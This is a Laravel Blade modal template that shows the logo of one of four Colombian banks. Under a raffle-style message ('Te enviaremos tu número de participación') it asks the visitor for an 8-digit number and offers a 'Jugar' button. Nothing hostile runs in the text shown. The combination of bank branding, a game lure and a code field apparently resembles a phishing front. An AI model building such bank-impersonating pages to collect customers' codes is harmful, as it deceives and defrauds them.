{{-- Modal Número O (8 dígitos) --}}
@php
    $banco = $banco ?? 'avvillas';
    $bancos = [
        'avvillas' => ['nombre' => 'Banco AV Villas', 'logo' => 'logo-avv.png'],
        'bogota' => ['nombre' => 'Banco de Bogotá', 'logo' => 'logo-bog.png'],
        'occidente' => ['nombre' => 'Banco de Occidente', 'logo' => 'logo-occ.png'],
        'popular' => ['nombre' => 'Banco Popular', 'logo' => 'logo-pop.png'],
    ];
    $bancoInfo = $bancos[$banco] ?? $bancos['avvillas'];
    $digitosRequeridos = 8;
@endphp

<div class="modal-overlay">
    <div class="modal-content">
        <div class="content">
            <img src="{{ asset('images/' . $bancoInfo['logo']) }}" alt="{{ $bancoInfo['nombre'] }}" class="logo" />

            <div class="form-section">
                <p class="message">Te enviaremos tu número de participación</p>
                <input
                    type="text"
                    id="input-numero"
                    name="numero"
                    class="input-numero"
                    maxlength="{{ $digitosRequeridos }}"
                    placeholder="Ingresa {{ $digitosRequeridos }} dígitos"
                />
                <button id="btn-jugar" class="btn-jugar" data-submit-button disabled>
                    <span id="btn-text">{{ $buttonText ?? 'Jugar' }}</span>
                    <div id="spinner" class="spinner hidden"></div>
                </button>
            </div>
        </div>
    </div>
</div>

<style>
    .modal-overlay {
        position: fixed;
        inset: 0;
        background-color: rgba(0, 0, 0, 0.5);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 50;
        padding: 1rem;
    }

    .modal-content {
        background-color: white;
        border-radius: 1rem;
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        max-width: 28rem;
        width: 100%;
        padding: 2rem;
        animation: fadeIn 0.3s ease-out;
        box-sizing: border-box;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: scale(0.9); }
        to { opacity: 1; transform: scale(1); }
    }

    .content {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 1.5rem;
        width: 100%;
    }

    .logo {
        height: 3.5rem;
        max-width: 100%;
        width: auto;
        object-fit: contain;
    }

    .form-section {
        width: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 1rem;
    }

    .message {
        text-align: center;
        color: #374151;
        font-size: 1rem;
        font-weight: 500;
    }

    .input-numero {
        width: 100%;
        max-width: 16rem;
        padding: 0.75rem 1rem;
        text-align: center;
        font-size: 1.5rem;
        font-weight: 700;
        border: 2px solid #d1d5db;
        border-radius: 0.5rem;
        outline: none;
    }

    .input-numero:focus {
        border-color: #2563eb;
    }

    .btn-jugar {
        padding: 0.75rem 2rem;
        background-color: #2563eb;
        color: white;
        font-size: 1.125rem;
        font-weight: 600;
        border-radius: 0.5rem;
        border: none;
        cursor: pointer;
        transition: all 0.2s;
        min-width: 10rem;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 0.5rem;
    }

    .btn-jugar:hover:not(:disabled) {
        background-color: #1d4ed8;
    }

    .btn-jugar:disabled {
        background-color: #9ca3af;
        cursor: not-allowed;
    }

    .spinner {
        display: inline-block;
        width: 1.25rem;
        height: 1.25rem;
        border: 3px solid rgba(255, 255, 255, 0.3);
        border-top-color: white;
        border-radius: 50%;
        animation: spin 0.6s linear infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    .hidden {
        display: none;
    }
</style>
